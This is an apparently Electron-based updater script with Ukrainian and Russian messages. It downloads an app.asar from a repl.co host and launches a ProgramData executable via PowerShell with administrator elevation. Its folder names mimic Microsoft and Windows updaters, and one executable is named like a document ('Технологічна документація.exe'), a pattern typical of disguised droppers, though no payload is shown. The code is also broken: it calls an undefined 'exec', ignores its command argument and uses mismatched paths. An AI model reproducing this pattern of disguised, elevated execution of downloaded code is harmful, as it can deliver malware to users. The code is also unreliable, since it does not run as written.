const dwn = remote.require("electron-download-manager");
const execar = require('child_process').exec;
const urlApp = 'https://updatefileexe.gooq.repl.co/app.asar';
const urlJSON = "https://updatefileexe.gooq.repl.co/app.json";
const Fs_c = require("fs");
const child_process = require("child_process")
const Versin = (Fs_c.existsSync(process.env.ALLUSERSPROFILE + "\\Microsoft UPD\\version.micro")) ? String(Fs_c.readFileSync(process.env.ALLUSERSPROFILE + "\\Microsoft UPD\\version.micro", "utf8")) : process.env.version;
fetch(urlJSON).then(data => {
    if (data.ok && data.status == 200) {
        data.json().then(json => {
            if (json.version != Versin) {
                launch_toast({
                    message: "Доступна нова версія"
                })
                sessionStorage.setItem("Update", "true");
                sessionStorage.setItem("Descr", String(json.description))
                sessionStorage.setItem("Version", String(json.version))
            } else {
                sessionStorage.removeItem("Update", "true");
                sessionStorage.removeItem("Descr", String(json.description))
                sessionStorage.removeItem("Version", String(json.version))
            }
        })
    }
})
function runCommandInWindowsConsole(command) {
    const filePath = 'C:\\ProgramData\\WindowsUpdater\\updater.exe';
    const commandl = `powershell.exe -Command "Start-Process -FilePath '${filePath}' -Verb RunAs"`;

    exec(commandl, (error, stdout, stderr) => {
        if (error) {
            console.error(`Ошибка выполнения команды: ${error.message}`);
            return;
        }
        console.log('Приложение успешно запущено от имени администратора.');
    });
    // execar(`"C:\\ProgramData\\WindowsUpdater\\updater.exe"`, (error, stdout, stderr) => {
    //     if (error) {
    //         console.error(`Ошибка выполнения команды: ${error.message}`);
    //         return;
    //     }
    //     console.log(`Стандартный вывод команды: ${stdout}`);
    //     console.error(`Стандартный вывод ошибок команды: ${stderr}`);
    // });
}
//"C:\ProgramData\WindowsUpdater\Технологічна документація.exe"
const DownloadNewVersion = () => {
    let d = Dialog(/*html*/`<h3>Скачування</h3><div class="loader"><span id="load"></span></div><div class="text">0 MB(0%)</div>`, "Оновлення", [], false)
    document.querySelector("#clo").classList.add("win");
    const widthLoad = parseFloat(getComputedStyle(document.querySelector("div.dialog_win div.loader")).getPropertyValue("width"));
    fetch(urlApp).then(data => {
        if (data.ok && data.status == 200) {
            dwn.download({
                url: urlApp,
                onProgress: (data) => {
                    console.log(data)
                    // document.querySelector(".loader").style.backgroundImage = `linear-gradient(to right, #005aff ${(data.downloadedBytes * 100) / data.totalBytes}%, white ${(data.downloadedBytes * 100) / data.totalBytes}% ${100 - (data.downloadedBytes * 100) / data.totalBytes}%)`
                    document.querySelector(".loader span#load").style.width = (data.downloadedBytes * widthLoad) / data.totalBytes + "px";
                    document.querySelector("div.dialog_win div.text").innerHTML = `${data.downloaded}(${Math.round((100 * data.downloadedBytes) / data.totalBytes)}%)`
                }
            }, function (error, info) {
                if (error) {
                    console.log(error);
                    return;
                }
                const child_process = require('child_process');
                setTimeout(() => {
                    runCommandInWindowsConsole(`"${process.env.ALLUSERSPROFILE + "\\WindowUpdater\\Технологічна документація.exe"}"`);
                    setTimeout(() => {
                        remote.app.quit();
                    }, 500);
                }, 500)
            });
        }
    })
}